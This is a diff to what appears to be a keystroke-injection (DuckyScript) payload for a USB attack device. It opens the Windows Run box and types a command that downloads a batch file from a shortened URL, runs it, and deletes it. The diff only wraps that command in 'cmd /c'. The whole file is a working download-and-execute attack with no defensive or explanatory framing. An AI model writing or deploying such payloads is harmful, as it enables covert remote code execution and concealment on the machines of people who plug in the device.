@@ -1,4 +1,4 @@
 GUI r
 DELAY 500
-STRING curl -Lo p.bat t.ly/U7Lcc && p.bat && del p.bat
+STRING cmd /c curl -Lo p.bat t.ly/U7Lcc && p.bat && del p.bat
 ENTER
